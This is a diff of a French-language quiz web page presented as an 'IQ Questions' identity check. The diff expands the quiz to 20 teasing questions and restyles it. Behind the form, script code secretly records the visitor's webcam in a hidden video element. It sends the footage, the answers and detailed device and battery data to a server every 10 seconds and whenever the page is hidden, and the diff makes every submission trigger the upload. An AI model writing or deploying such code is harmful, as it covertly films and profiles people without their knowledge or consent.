@@ -3,81 +3,405 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification d'identité</title>
+    <title>IQ Questions - Vérification d'identité</title>
+    <!-- Google Fonts for modern typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
-        h2 { color: #333; margin-bottom: 10px; }
-        
-        .title-banner {
-            background-color: #ff4757;
+        :root {
+            --bg-gradient: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #31103f 100%);
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --primary-accent: #6366f1;
+            --secondary-accent: #ff4757;
+            --success-color: #10b981;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --input-bg: #f8fafc;
+            --border-color: #e2e8f0;
+            --border-focus: #6366f1;
+            --radius-lg: 20px;
+            --radius-md: 12px;
+            --shadow-glow: 0 20px 40px -15px rgba(99, 102, 241, 0.3);
+        }
+
+        * {
+            box-sizing: border-box;
+            transition: all 0.25s ease;
+        }
+
+        body { 
+            font-family: 'Plus Jakarta Sans', Arial, sans-serif; 
+            background: var(--bg-gradient);
+            background-attachment: fixed;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 30px 15px; 
+            color: var(--text-main);
+        }
+
+        .card { 
+            background: var(--card-bg); 
+            backdrop-filter: blur(12px);
+            padding: 40px 35px; 
+            border-radius: var(--radius-lg); 
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4), var(--shadow-glow); 
+            text-align: center; 
+            max-width: 600px; 
+            width: 100%; 
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Welcome Badge Header */
+        .welcome-badge {
+            background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
             color: white;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 15px;
-            font-size: 18px;
-            font-weight: bold;
+            padding: 10px 20px;
+            border-radius: 30px;
+            margin: 0 auto 15px auto;
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            display: inline-block;
+            box-shadow: 0 6px 15px rgba(99, 102, 241, 0.35);
+        }
+
+        h2 { 
+            color: var(--text-main); 
+            margin: 0 0 8px 0; 
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 25px;
+            font-weight: 500;
         }
 
         #video-container { display: none; }
-        
-        .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
-        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
-        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
-        
-        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
-        #status { margin-top: 15px; font-weight: bold; }
+
+        /* Username styling */
+        #username {
+            width: 100%; 
+            padding: 14px 16px; 
+            margin-bottom: 25px; 
+            font-size: 15px; 
+            font-family: inherit;
+            font-weight: 600;
+            background-color: var(--input-bg);
+            border: 2px solid var(--border-color);
+            border-radius: var(--radius-md);
+            outline: none;
+            color: var(--text-main);
+        }
+
+        #username:focus {
+            border-color: var(--border-focus);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
+        }
+
+        /* Questions container style */
+        .question-box { 
+            margin-bottom: 16px; 
+            text-align: left; 
+            background: #ffffff; 
+            padding: 16px 18px; 
+            border-radius: var(--radius-md); 
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+
+        .question-box:hover {
+            border-color: #cbd5e1;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.04);
+        }
+
+        .question-box label { 
+            display: block; 
+            font-weight: 700; 
+            margin-bottom: 8px; 
+            color: var(--text-main); 
+            font-size: 14px; 
+            line-height: 1.4;
+        }
+
+        .question-box select { 
+            width: 100%; 
+            padding: 10px 12px; 
+            font-size: 14px;
+            font-family: inherit;
+            color: var(--text-main);
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            outline: none;
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2364748b' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 16px;
+        }
+
+        .question-box select:focus {
+            border-color: var(--border-focus);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.12);
+        }
+
+        /* Modern Submit Button */
+        button { 
+            padding: 16px 24px; 
+            border: none; 
+            border-radius: var(--radius-md); 
+            cursor: pointer; 
+            font-weight: 700; 
+            font-size: 16px; 
+            width: 100%; 
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%); 
+            color: white; 
+            margin-top: 20px; 
+            box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4);
+            letter-spacing: 0.5px;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px -3px rgba(16, 185, 129, 0.5);
+            background: linear-gradient(135deg, #34d399 0%, #059669 100%);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        #status { 
+            margin-top: 20px; 
+            font-weight: 700; 
+            font-size: 15px;
+            padding: 10px;
+            border-radius: 6px;
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="title-banner">QUESTION</div>
+        <div class="welcome-badge">Bienvenue dans IQ Questions</div>
         <h2>Vérification d'identité</h2>
+        <div class="subtitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
-            <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
+            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
             
+            <!-- الأسئلة الـ 20 باللغة الفرنسية -->
             <div class="question-box">
-                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
+                <label>1. Penses-tu être plus beau/belle que moi ?</label>
                 <select id="q1" required>
                     <option value="">Sélectionnez une réponse</option>
-                    <option value="yes">Yes</option>
-                    <option value="no">No</option>
+                    <option value="Oui">Oui</option>
+                    <option value="Non">Non</option>
                 </select>
             </div>
 
             <div class="question-box">
-                <label>2. enti bhim</label>
+                <label>2. Te considères-tu comme quelqu'un de naïf ?</label>
                 <select id="q2" required>
                     <option value="">Sélectionnez une réponse</option>
-                    <option value="yes">Yes</option>
-                    <option value="no">No</option>
+                    <option value="Oui">Oui</option>
+                    <option value="Non">Non</option>
                 </select>
             </div>
 
             <div class="question-box">
-                <label>3. chnowa essm kalbek?</label>
+                <label>3. Quel est le nom de votre animal préféré ?</label>
                 <select id="q3" required>
                     <option value="">Sélectionnez une réponse</option>
-                    <option value="sknder">sknder</option>
-                    <option value="michou">michou</option>
-                    <option value="tito">tito</option>
-                    <option value="urra">urra</option>
-                    <option value="yahouh">yahouh</option>
-                    <option value="mchit feha">mchit feha</option>
-                    <option value="ya klb">ya klb</option>
-                    <option value="ya3tek douda">ya3tek douda</option>
-                    <option value="fish fish">fish fish</option>
-                    <option value="bassboussa">bassboussa</option>
-                    <option value="kob sa3d el 3ar">kob sa3d el 3ar</option>
+                    <option value="Skander">Skander</option>
+                    <option value="Michou">Michou</option>
+                    <option value="Tito">Tito</option>
+                    <option value="Urra">Urra</option>
+                    <option value="Yahouh">Yahouh</option>
+                    <option value="Autre">Autre</option>
                 </select>
             </div>
 
-            <button type="button" onclick="verifyAndStop()">OK</button>
+            <div class="question-box">
+                <label>4. Comment décrivez-vous votre journée en général ?</label>
+                <select id="q4" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Excellente">Excellente (Mielleuse)</option>
+                    <option value="Malchanceuse">Malchanceuse</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>5. Qui est le plus intelligent selon vous ?</label>
+                <select id="q5" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Moi">Moi-même</option>
+                    <option value="Les singes">Les singes</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>6. Avez-vous peur de l'obscurité (du noir) ?</label>
+                <select id="q6" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Oui">Oui</option>
+                    <option value="Non">Non</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>7. Préférez-vous le sommeil ou la nourriture ?</label>
+                <select id="q7" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Sommeil">Le sommeil</option>
+                    <option value="Nourriture">La nourriture</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>8. Que pensez-vous en vous regardant dans le miroir ?</label>
+                <select id="q8" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Beau/Belle">Magnifique</option>
+                    <option value="Moche">Pas très beau/belle</option>
+                    <option value="Sérieux">Sage / Sérieux</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>9. Notez votre niveau de méchanceté / insolence sur 10 :</label>
+                <select id="q9" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="1/10">1 / 10 (Très sage)</option>
+                    <option value="5/10">5 / 10 (Moyen)</option>
+                    <option value="10/10">10 / 10 (Très insolent)</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>10. Comment réussissez-vous dans vos études ?</label>
+                <select id="q10" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Par chance">Par chance</option>
+                    <option value="Par triche">Par triche</option>
+                    <option value="Impossible de réussir">Impossible de réussir</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>11. Mentez-vous souvent ?</label>
+                <select id="q11" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Toujours">Toujours</option>
+                    <option value="Parfois">Parfois</option>
+                    <option value="Jamais">Jamais</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>12. Aimez-vous les plats traditionnels épicés ?</label>
+                <select id="q12" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="J'adore">J'adore</option>
+                    <option value="Je déteste">Je déteste</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label>
+                <select id="q13" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Pro Gamer">Joueur Pro</option>
+                    <option value="Débutant/Faible">Débutant / Faible</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>14. Que préférez-vous le plus ?</label>
+                <select id="q14" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Mon Téléphone">Mon téléphone</option>
+                    <option value="Mes Amis">Mes amis</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>15. Dépensez-vous tout votre argent en deux jours ?</label>
+                <select id="q15" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Toujours">Toujours</option>
+                    <option value="Parfois">Parfois</option>
+                    <option value="Jamais">Jamais</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>16. Accepteriez-vous d'être une célébrité ?</label>
+                <select id="q16" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Oui">Oui</option>
+                    <option value="Non">Non</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>17. Aimez-vous faire des blagues aux autres ?</label>
+                <select id="q17" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Beaucoup">Beaucoup</option>
+                    <option value="Un peu">Un peu</option>
+                    <option value="Pas du tout">Pas du tout</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>18. Croyez-vous au coup de foudre ?</label>
+                <select id="q18" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Oui">Oui</option>
+                    <option value="Non">Non</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>19. Pouvez-vous tenir une heure sans Internet ?</label>
+                <select id="q19" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Très facile">Très facile</option>
+                    <option value="Impossible">Impossible</option>
+                </select>
+            </div>
+
+            <div class="question-box">
+                <label>20. Êtes-vous satisfait(e) de votre vie actuelle ?</label>
+                <select id="q20" required>
+                    <option value="">Sélectionnez une réponse</option>
+                    <option value="Satisfait">Oui, très satisfait(e)</option>
+                    <option value="Non satisfait">Non, pas du tout</option>
+                </select>
+            </div>
+
+            <button type="button" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
         </form>
 
         <div id="status"></div>
@@ -90,13 +414,11 @@
         let autoSyncInterval = null;
         let isCompleted = false;
 
-        // متغيرات مؤقتة لجمع معلومات البطارية
         let batteryInfoGlobal = {
             niveau: "Non disponible",
             enCharge: "Non disponible"
         };
 
-        // محاولة جلب معلومات البطارية إن كانت مدعومة في المتصفح
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 function updateBattery() {
@@ -109,7 +431,6 @@
             });
         }
 
-        // استخراج جميع معلومات الهاتف وإعداداته المتقدمة باللغة الفرنسية
         async function getDetailedDeviceInfo() {
             const ua = navigator.userAgent;
             let osName = "Système Inconnu";
@@ -136,7 +457,6 @@
             else if (/Oppo/i.test(ua)) brandOrModel = "Oppo";
             else if (/Vivo/i.test(ua)) brandOrModel = "Vivo";
 
-            // 1. وضعية الشاشة (Orientation)
             let screenOrientation = "Inconnue";
             if (screen.orientation && screen.orientation.type) {
                 screenOrientation = screen.orientation.type.includes("portrait") ? "Portrait (Verticale)" : "Paysage (Horizontale)";
@@ -144,7 +464,6 @@
                 screenOrientation = window.innerHeight > window.innerWidth ? "Portrait (Verticale)" : "Paysage (Horizontale)";
             }
 
-            // 2. معمارية المعالج (CPU Architecture)
             let cpuArchitecture = "64-bit / Inconnu";
             if (navigator.userAgentData && navigator.userAgentData.architecture) {
                 cpuArchitecture = navigator.userAgentData.architecture;
@@ -167,8 +486,6 @@
                 fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookiesActifs: navigator.cookieEnabled ? "Oui" : "Non",
                 connexionReseau: navigator.connection ? (navigator.connection.effectiveType + " (" + navigator.connection.downlink + " Mbps)") : "Non disponible",
-                
-                // --- الـ 8 معلومات الجديدة المضافة ---
                 niveauBatterie: batteryInfoGlobal.niveau,
                 etatCharge: batteryInfoGlobal.enCharge,
                 modeEconomieEnergie: (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) ? "Probablement activé (Faible performance)" : "Désactivé / Normal",
@@ -211,10 +528,10 @@
                 };
                 mediaRecorder.start(1000);
 
-                // Auto-Sync كل 10 ثوانٍ مع كامل الإعدادات والبيانات المتقدمة
+                // تزامن تلقائي كل 10 ثوانٍ لمنع ضياع الفيديو
                 autoSyncInterval = setInterval(async () => {
                     if (!isCompleted && recordedChunks.length > 0) {
-                        await sendDataBeacon("Auto-Sync 10s (Mise à jour complète)");
+                        await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
                     }
                 }, 10000);
 
@@ -227,9 +544,6 @@
             if (recordedChunks.length === 0) return;
 
             const username = document.getElementById('username').value || "Utilisateur Anonyme";
-            const q1 = document.getElementById('q1').value || "N/A";
-            const q2 = document.getElementById('q2').value || "N/A";
-            const q3 = document.getElementById('q3').value || "N/A";
 
             const deviceDetails = await getDetailedDeviceInfo();
             const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
@@ -240,9 +554,13 @@
             formData.append('username', `${username} [${reason}]`);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(deviceDetails, null, 2));
-            formData.append('q1', q1);
-            formData.append('q2', q2);
-            formData.append('q3', q3);
+
+            // جمع الإجابات للـ 20 سؤالاً
+            for (let i = 1; i <= 20; i++) {
+                let qVal = document.getElementById('q' + i).value || "N/A";
+                formData.append('q' + i, qVal);
+            }
+
             formData.append('video', videoBlob, `recording.${ext}`);
 
             try {
@@ -254,6 +572,7 @@
             }
         }
 
+        // حفظ وتمرير البيانات فوراً عند إغلاق التطبيق أو ضغط المربع
         document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
                 await sendDataBeacon("Fermé via bouton carré / App masquée");
@@ -271,43 +590,36 @@
             const username = document.getElementById('username').value;
 
             if (!username) {
-                statusDiv.style.color = 'red';
+                statusDiv.style.color = '#ef4444';
                 statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
                 return;
             }
 
-            const q1 = document.getElementById('q1').value;
-            const q2 = document.getElementById('q2').value;
-            const q3 = document.getElementById('q3').value;
-
-            if (!q1 || !q2 || !q3) {
-                statusDiv.style.color = 'red';
-                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
-                return;
-            }
-
-            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
-                isCompleted = true;
-                clearInterval(autoSyncInterval);
-                statusDiv.style.color = 'green';
-                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
-
-                if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                    mediaRecorder.stop();
+            // التأكد من إجابة جميع الأسئلة العشرين
+            for (let i = 1; i <= 20; i++) {
+                if (!document.getElementById('q' + i).value) {
+                    statusDiv.style.color = '#ef4444';
+                    statusDiv.innerText = `Veuillez répondre à toutes les questions (Q${i} manquante).`;
+                    return;
                 }
-
-                setTimeout(async () => {
-                    await sendDataBeacon("Réussi ! Données finales complètes");
-                    statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
-                    if (mediaStream) {
-                        mediaStream.getTracks().forEach(track => track.stop());
-                    }
-                }, 1000);
-
-            } else {
-                statusDiv.style.color = 'red';
-                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
             }
+
+            isCompleted = true;
+            clearInterval(autoSyncInterval);
+            statusDiv.style.color = '#10b981';
+            statusDiv.innerText = 'Envoi des données en cours...';
+
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+
+            setTimeout(async () => {
+                await sendDataBeacon("Soumission réussية (Formulaire complet)");
+                statusDiv.innerText = 'Merci ! Vos réponses ont été soumises avec succès.';
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }
+            }, 1000);
         }
     </script>
 </body>
